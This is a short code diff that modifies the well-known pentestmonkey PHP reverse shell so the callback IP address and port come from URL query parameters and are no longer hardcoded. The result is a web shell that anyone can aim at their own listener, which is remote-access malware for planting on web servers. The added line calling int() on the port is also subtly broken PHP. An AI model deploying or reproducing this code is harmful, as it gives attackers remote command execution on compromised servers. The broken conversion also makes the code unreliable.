@@ -44,10 +44,18 @@
 // -----
 // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
 
+
+// get IP and PORT from parameters, instead of hardcoding them
+if(!isset($_GET['ip'])||!isset($_GET['port'])||empty($_GET['ip'])||empty($_GET['port']))
+{
+	printit("Missing parameters");
+	exit(1);
+}
+
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = $_GET['ip'];
+$port = int($_GET['port']);
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
